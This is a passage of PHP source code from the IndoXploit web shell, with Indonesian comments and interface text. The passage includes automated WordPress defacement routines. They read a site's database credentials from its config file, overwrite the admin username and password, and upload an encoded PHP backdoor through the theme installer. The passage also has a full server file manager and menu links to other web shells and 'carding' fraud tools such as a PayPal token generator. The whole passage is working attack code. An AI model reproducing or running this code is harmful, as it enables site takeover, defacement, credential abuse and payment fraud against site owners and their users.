							"_wp_http_referer" => "/wp-admin/theme-install.php?upload",
							"themezip" => "@$www",
							"install-theme-submit" => "Install Now",
							);
					$ch = curl_init("$target/wp-admin/update.php?action=upload-theme");
						  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
						  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
						  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
						  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
						  curl_setopt($ch, CURLOPT_POST, 1);
						  curl_setopt($ch, CURLOPT_POSTFIELDS, $post2);
						  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
						  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
					      curl_setopt($ch, CURLOPT_COOKIESESSION, true);
					$data3 = curl_exec($ch);
						  curl_close($ch);
					$y = date("Y");
					$m = date("m");
					$namafile = "id.php";
					$fpi = fopen($namafile,"w");
					fputs($fpi,$script);
					$ch6 = curl_init("$target/wp-content/uploads/$y/$m/$www");
						   curl_setopt($ch6, CURLOPT_POST, true);
						   curl_setopt($ch6, CURLOPT_POSTFIELDS, array('file3'=>"@$namafile"));
						   curl_setopt($ch6, CURLOPT_RETURNTRANSFER, 1);
						   curl_setopt($ch6, CURLOPT_COOKIEFILE, "cookie.txt");
	       		  		   curl_setopt($ch6, CURLOPT_COOKIEJAR,'cookie.txt');
	       		  		   curl_setopt($ch6, CURLOPT_COOKIESESSION, true);
					$postResult = curl_exec($ch6);
						   curl_close($ch6);
					$as = "$target/k.php";
					$bs = anucurl($as);
					if(preg_match("#$script#is", $bs)) {
            	       	echo "[+] <font color='lime'>berhasil mepes...</font><br>";
            	       	echo "[+] <a href='$as' target='_blank'>$as</a><br><br>"; 
            	        } else {
            	        echo "[-] <font color='red'>gagal mepes...</font><br>";
            	        echo "[!!] coba aja manual: <br>";
            	        echo "[+] <a href='$target/wp-login.php' target='_blank'>$target/wp-login.php</a><br>";
            	        echo "[+] username: <font color=lime>$user</font><br>";
            	        echo "[+] password: <font color=lime>$pass</font><br><br>";     
            	        }
            		mysql_close($conn);
				}
			}
		}
	} else {
		echo "<center><h1>WordPress Auto Deface</h1>
		<form method='post'>
		<input type='text' name='link_config' size='50' height='10' value='$dir'><br>
		<input type='text' name='script' height='10' size='50' placeholder='pwnd By cor0.id' required><br>
		<input type='submit' style='width: 450px;' name='auto_deface_wp' value='Hajar!!'>
		</form>
		<br><span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span>
		</center>";
	}
} elseif($_GET['do'] == 'auto_dwp2') {
	if($_POST['auto_deface_wp']) {
		function anucurl($sites) {
    		$ch = curl_init($sites);
	       		  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	       		  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	       		  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
	       		  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
	       		  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	       		  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	       		  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
	       		  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
	       		  curl_setopt($ch, CURLOPT_COOKIESESSION,true);
			$data = curl_exec($ch);
				  curl_close($ch);
			return $data;
		}
		function lohgin($cek, $web, $userr, $pass, $wp_submit) {
    		$post = array(
                   "log" => "$userr",
                   "pwd" => "$pass",
                   "rememberme" => "forever",
                   "wp-submit" => "$wp_submit",
                   "redirect_to" => "$web",
                   "testcookie" => "1",
                   );
			$ch = curl_init($cek);
				  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
				  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
				  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
				  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
				  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
				  curl_setopt($ch, CURLOPT_POST, 1);
				  curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
				  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
				  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
				  curl_setopt($ch, CURLOPT_COOKIESESSION, true);
			$data = curl_exec($ch);
				  curl_close($ch);
			return $data;
		}
		$link = explode("\r\n", $_POST['link']);
		$script = htmlspecialchars($_POST['script']);
		$user = "indoxploit";
		$pass = "indoxploit";
		$passx = md5($pass);
		foreach($link as $dir_config) {
			$config = anucurl($dir_config);
			$dbhost = ambilkata($config,"DB_HOST', '","'");
			$dbuser = ambilkata($config,"DB_USER', '","'");
			$dbpass = ambilkata($config,"DB_PASSWORD', '","'");
			$dbname = ambilkata($config,"DB_NAME', '","'");
			$dbprefix = ambilkata($config,"table_prefix  = '","'");
			$prefix = $dbprefix."users";
			$option = $dbprefix."options";
			$conn = mysql_connect($dbhost,$dbuser,$dbpass);
			$db = mysql_select_db($dbname);
			$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
			$result = mysql_fetch_array($q);
			$id = $result[ID];
			$q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
			$result2 = mysql_fetch_array($q2);
			$target = $result2[option_value];
			if($target == '') {					
				echo "[-] <font color=red>error, gabisa ambil nama domain nya</font><br>";
			} else {
				echo "[+] $target <br>";
			}
			$update = mysql_query("UPDATE $prefix SET user_login='$user',user_pass='$passx' WHERE ID='$id'");
			if(!$conn OR !$db OR !$update) {
				echo "[-] MySQL Error: <font color=red>".mysql_error()."</font><br><br>";
				mysql_close($conn);
			} else {
				$site = "$target/wp-login.php";
				$site2 = "$target/wp-admin/theme-install.php?upload";
				$b1 = anucurl($site2);
				$wp_sub = ambilkata($b1, "id=\"wp-submit\" class=\"button button-primary button-large\" value=\"","\" />");
				$b = lohgin($site, $site2, $user, $pass, $wp_sub);
				$anu2 = ambilkata($b,"name=\"_wpnonce\" value=\"","\" />");
				$upload3 = base64_decode("Z2FudGVuZw0KPD9waHANCiRmaWxlMyA9ICRfRklMRVNbJ2ZpbGUzJ107DQogICRuZXdmaWxlMz0iay5waHAiOw0KICAgICAgICAgICAgICAgIGlmIChmaWxlX2V4aXN0cygiLi4vLi4vLi4vLi4vIi4kbmV3ZmlsZTMpKSB1bmxpbmsoIi4uLy4uLy4uLy4uLyIuJG5ld2ZpbGUzKTsNCiAgICAgICAgbW92ZV91cGxvYWRlZF9maWxlKCRmaWxlM1sndG1wX25hbWUnXSwgIi4uLy4uLy4uLy4uLyRuZXdmaWxlMyIpOw0KDQo/Pg==");
				$www = "m.php";
				$fp5 = fopen($www,"w");
				fputs($fp5,$upload3);
				$post2 = array(
						"_wpnonce" => "$anu2",
						"_wp_http_referer" => "/wp-admin/theme-install.php?upload",
						"themezip" => "@$www",
						"install-theme-submit" => "Install Now",
						);
				$ch = curl_init("$target/wp-admin/update.php?action=upload-theme");
					  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
					  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
					  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
					  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
					  curl_setopt($ch, CURLOPT_POST, 1);
					  curl_setopt($ch, CURLOPT_POSTFIELDS, $post2);
					  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
					  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
				      curl_setopt($ch, CURLOPT_COOKIESESSION, true);
				$data3 = curl_exec($ch);
					  curl_close($ch);
				$y = date("Y");
				$m = date("m");
				$namafile = "id.php";
				$fpi = fopen($namafile,"w");
				fputs($fpi,$script);
				$ch6 = curl_init("$target/wp-content/uploads/$y/$m/$www");
					   curl_setopt($ch6, CURLOPT_POST, true);
					   curl_setopt($ch6, CURLOPT_POSTFIELDS, array('file3'=>"@$namafile"));
					   curl_setopt($ch6, CURLOPT_RETURNTRANSFER, 1);
					   curl_setopt($ch6, CURLOPT_COOKIEFILE, "cookie.txt");
	       		  	   curl_setopt($ch6, CURLOPT_COOKIEJAR,'cookie.txt');
	       		 	   curl_setopt($ch6, CURLOPT_COOKIESESSION,true);
				$postResult = curl_exec($ch6);
					   curl_close($ch6);
				$as = "$target/k.php";
				$bs = anucurl($as);
				if(preg_match("#$script#is", $bs)) {
                   	echo "[+] <font color='lime'>berhasil mepes...</font><br>";
                   	echo "[+] <a href='$as' target='_blank'>$as</a><br><br>"; 
                    } else {
                    echo "[-] <font color='red'>gagal mepes...</font><br>";
                    echo "[!!] coba aja manual: <br>";
                    echo "[+] <a href='$target/wp-login.php' target='_blank'>$target/wp-login.php</a><br>";
                    echo "[+] username: <font color=lime>$user</font><br>";
                    echo "[+] password: <font color=lime>$pass</font><br><br>";     
                    }
            	mysql_close($conn);
			}
		}
	} else {
		echo "<center><h1>WordPress Auto Deface V.2</h1>
		<form method='post'>
		Link Config: <br>
		<textarea name='link' placeholder='http://target.com/idx_config/user-config.txt' style='width: 450px; height:250px;'></textarea><br>
		<input type='text' name='script' height='10' size='50' placeholder='pwnd By cor0.id' required><br>
		<input type='submit' style='width: 450px;' name='auto_deface_wp' value='Cr00tzz!!'>
		</form></center>";
	}
} elseif($_GET['act'] == 'newfile') {
	if($_POST['new_save_file']) {
		$newfile = htmlspecialchars($_POST['newfile']);
		$fopen = fopen($newfile, "a+");
		if($fopen) {
			$act = "<script>window.location='?act=edit&dir=".$dir."&file=".$_POST['newfile']."';</script>";
		} else {
			$act = "<font color=red>permission denied</font>";
		}
	}
	echo $act;
	echo "<form method='post'>
	Filename: <input type='text' name='newfile' value='$dir/newfile.php' style='width: 450px;' height='10'>
	<input type='submit' name='new_save_file' value='Submit'>
	</form>";
} elseif($_GET['act'] == 'newfolder') {
	if($_POST['new_save_folder']) {
		$new_folder = $dir.'/'.htmlspecialchars($_POST['newfolder']);
		if(!mkdir($new_folder)) {
			$act = "<font color=red>permission denied</font>";
		} else {
			$act = "<script>window.location='?dir=".$dir."';</script>";
		}
	}
	echo $act;
	echo "<form method='post'>
	Folder Name: <input type='text' name='newfolder' style='width: 450px;' height='10'>
	<input type='submit' name='new_save_folder' value='Submit'>
	</form>";
} elseif($_GET['act'] == 'rename_dir') {
	if($_POST['dir_rename']) {
		$dir_rename = rename($dir, "".dirname($dir)."/".htmlspecialchars($_POST['fol_rename'])."");
		if($dir_rename) {
			$act = "<script>window.location='?dir=".dirname($dir)."';</script>";
		} else {
			$act = "<font color=red>permission denied</font>";
		}
	echo "".$act."<br>";
	}
	echo "<form method='post'>
	<input type='text' value='".basename($dir)."' name='fol_rename' style='width: 450px;' height='10'>
	<input type='submit' name='dir_rename' value='rename'>
	</form>";
} elseif($_GET['act'] == 'delete_dir') {
	function Delete($path)
{
    if (is_dir($path) === true)
    {
        $files = array_diff(scandir($path), array('.', '..'));
        foreach ($files as $file)
        {
            Delete(realpath($path) . '/' . $file);
        }
        return rmdir($path);
    }
    else if (is_file($path) === true)
    {
        return unlink($path);
    }
    return false;
}
	$delete_dir = Delete($dir);
	if($delete_dir) {
		$act = "<script>window.location='?dir=".dirname($dir)."';</script>";
	} else {
		$act = "<font color=red>could not remove ".basename($dir)."</font>";
	}
	echo $act;
} elseif($_GET['act'] == 'view') {
	echo "Filename: <font color=lime>".basename($_GET['file'])."</font> [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'><b>view</b></a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'>edit</a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'>rename</a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
	echo "<textarea readonly>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea>";
} elseif($_GET['act'] == 'edit') {
	if($_POST['save']) {
		$save = file_put_contents($_GET['file'], $_POST['src']);
		if($save) {
			$act = "<font color=lime>Saved!</font>";
		} else {
			$act = "<font color=red>permission denied</font>";
		}
	echo "".$act."<br>";
	}
	echo "Filename: <font color=lime>".basename($_GET['file'])."</font> [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'>view</a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'><b>edit</b></a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'>rename</a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
	echo "<form method='post'>
	<textarea name='src'>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea><br>
	<input type='submit' value='Save' name='save' style='width: 500px;'>
	</form>";
} elseif($_GET['act'] == 'rename') {
	if($_POST['do_rename']) {
		$rename = rename($_GET['file'], "$dir/".htmlspecialchars($_POST['rename'])."");
		if($rename) {
			$act = "<script>window.location='?dir=".$dir."';</script>";
		} else {
			$act = "<font color=red>permission denied</font>";
		}
	echo "".$act."<br>";
	}
	echo "Filename: <font color=lime>".basename($_GET['file'])."</font> [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'>view</a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'>edit</a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'><b>rename</b></a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
	echo "<form method='post'>
	<input type='text' value='".basename($_GET['file'])."' name='rename' style='width: 450px;' height='10'>
	<input type='submit' name='do_rename' value='rename'>
	</form>";
} elseif($_GET['act'] == 'delete') {
	$delete = unlink($_GET['file']);
	if($delete) {
		$act = "<script>window.location='?dir=".$dir."';</script>";
	} else {
		$act = "<font color=red>permission denied</font>";
	}
	echo $act;
}else {
	if(is_dir($dir) == true) {
		echo '<table width="100%" class="table_home" border="0" cellpadding="3" cellspacing="1" align="center">
		<tr>
		<th class="th_home"><center>Name</center></th>
		<th class="th_home"><center>Type</center></th>
		<th class="th_home"><center>Size</center></th>
		<th class="th_home"><center>Last Modified</center></th>
		<th class="th_home"><center>Permission</center></th>
		<th class="th_home"><center>Action</center></th>
		</tr>';
		$scandir = scandir($dir);
		foreach($scandir as $dirx) {
			$dtype = filetype("$dir/$dirx");
			$dtime = date("F d Y g:i:s", filemtime("$dir/$dirx"));
 			if(!is_dir("$dir/$dirx")) continue;
 			if($dirx === '..') {
 				$href = "<a href='?dir=".dirname($dir)."'>$dirx</a>";
 			} elseif($dirx === '.') {
 				$href = "<a href='?dir=$dir'>$dirx</a>";
 			} else {
 				$href = "<a href='?dir=$dir/$dirx'>$dirx</a>";
 			}
 			if($dirx === '.' || $dirx === '..') {
 				$act_dir = "<a href='?act=newfile&dir=$dir'>newfile</a> | <a href='?act=newfolder&dir=$dir'>newfolder</a>";
 				} else {
 				$act_dir = "<a href='?act=rename_dir&dir=$dir/$dirx'>rename</a> | <a href='?act=delete_dir&dir=$dir/$dirx'>delete</a>";
 			}
 			echo "<tr>";
 			echo "<td class='td_home'><img src='data:image/png;base64,R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAA"."AAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp"."/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs='>$href</td>";
			echo "<td class='td_home'><center>$dtype</center></td>";
			echo "<td class='td_home'><center>-</center></th>";
			echo "<td class='td_home'><center>$dtime</center></td>";
			echo "<td class='td_home'><center>".w("$dir/$dirx",perms("$dir/$dirx"))."</center></td>";
			echo "<td class='td_home' style='padding-left: 15px;'>$act_dir</td>";
		}
		echo "</tr>";
		foreach($scandir as $file) {
			$ftype = filetype("$dir/$file");
			$ftime = date("F d Y g:i:s", filemtime("$dir/$file"));
			$size = filesize("$dir/$file")/1024;
			$size = round($size,3);
			if($size > 1024) {
				$size = round($size/1024,2). 'MB';
			} else {
				$size = $size. 'KB';
			}
			if(!is_file("$dir/$file")) continue;
			echo "<tr>";
			echo "<td class='td_home'><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9oJBhcTJv2B2d4AAAJMSURBVDjLbZO9ThxZEIW/qlvdtM38BNgJQmQgJGd+A/MQBLwGjiwH3nwdkSLtO2xERG5LqxXRSIR2YDfD4GkGM0P3rb4b9PAz0l7pSlWlW0fnnLolAIPB4PXh4eFunucAIILwdESeZyAifnp6+u9oNLo3gM3NzTdHR+//zvJMzSyJKKodiIg8AXaxeIz1bDZ7MxqNftgSURDWy7LUnZ0dYmxAFAVElI6AECygIsQQsizLBOABADOjKApqh7u7GoCUWiwYbetoUHrrPcwCqoF2KUeXLzEzBv0+uQmSHMEZ9F6SZcr6i4IsBOa/b7HQMaHtIAwgLdHalDA1ev0eQbSjrErQwJpqF4eAx/hoqD132mMkJri5uSOlFhEhpUQIiojwamODNsljfUWCqpLnOaaCSKJtnaBCsZYjAllmXI4vaeoaVX0cbSdhmUR3zAKvNjY6Vioo0tWzgEonKbW+KkGWt3Unt0CeGfJs9g+UU0rEGHH/Hw/MjH6/T+POdFoRNKChM22xmOPespjPGQ6HpNQ27t6sACDSNanyoljDLEdVaFOLe8ZkUjK5ukq3t79lPC7/ODk5Ga+Y6O5MqymNw3V1y3hyzfX0hqvJLybXFd++f2d3d0dms+qvg4ODz8fHx0/Lsbe3964sS7+4uEjunpqmSe6e3D3N5/N0WZbtly9f09nZ2Z/b29v2fLEevvK9qv7c2toKi8UiiQiqHbm6riW6a13fn+zv73+oqorhcLgKUFXVP+fn52+Lonj8ILJ0P8ZICCF9/PTpClhpBvgPeloL9U55NIAAAAAASUVORK5CYII='><a href='?act=view&dir=$dir&file=$dir/$file'>$file</a></td>";
			echo "<td class='td_home'><center>$ftype</center></td>";
			echo "<td class='td_home'><center>$size</center></td>";
			echo "<td class='td_home'><center>$ftime</center></td>";
			echo "<td class='td_home'><center>".w("$dir/$file",perms("$dir/$file"))."</center></td>";
			echo "<td class='td_home' style='padding-left: 15px;'><a href='?act=edit&dir=$dir&file=$dir/$file'>edit</a> | <a href='?act=rename&dir=$dir&file=$dir/$file'>rename</a> | <a href='?act=delete&dir=$dir&file=$dir/$file'>delete</a> | <a href='?act=download&dir=$dir&file=$dir/$file'>download</a></td>";
		}
		echo "</tr></table>";
	} else {
		echo "<font color=red>can't open directory</font>";
	}
	}
echo "<center><hr><form>
<select onchange='if (this.value) window.open(this.value);'>
   <option selected='selected' value=''> All T00ls </option>
   <option value='$ling=wso'>WSO 2.8.1</option>
   <option value='$ling=injection'>1n73ction v3</option>
   <option value='$ling=wk'>WHMCS Killer</option>
   <option value='$ling=adminer'>Adminer</option>
   <option value='$ling=b374k'>b374k Shell</option>
   <option value='$ling=b374k323'>b374k 3.2</option>   
   <option value='$ling=bh'>BlackHat Shell</option>      
   <option value='$ling=dhanus'>Dhanush Shell</option>     
   <option value='$ling=r57'>R57 Shell</option>    
<option value='$ling=encodedecode'>Encode Decode</option>    
<option value='$ling=r57'>R57 Shell</option>    
</select>
<select onchange='if (this.value) window.open(this.value);'>
   <option selected='selected' value=''> Carding T00ls </option>
   <option value='$ling=extractor'>DB Email Extractor</option>
   <option value='$ling=promailerv2'>Pro Mailer V2</option>     
   <option value='$ling=bukalapak'>BukaLapak Checker</option>        
   <option value='$ling=tokopedia'>TokoPedia Checker</option>  
   <option value='$ling=tokenpp'>Paypal Token Generator</option>  
   <option value='$ling=mailer'>Mailer</option>  
   <option value='$ling=gamestopceker'>GamesTop Checker</option>
   </select>
<noscript><input type='submit' value='Submit'></noscript>
</form>Copyright &copy; ".date("Y")." - <a href='http://forum.indoxploit.or.id/' target='_blank'><font color=lime>IndoXploit</font></a> Shell Recoded By <a href='http://zroot.ml' target='_BLANK'><font color=lime>cor0.id</a></font></center>";
?>
</html>
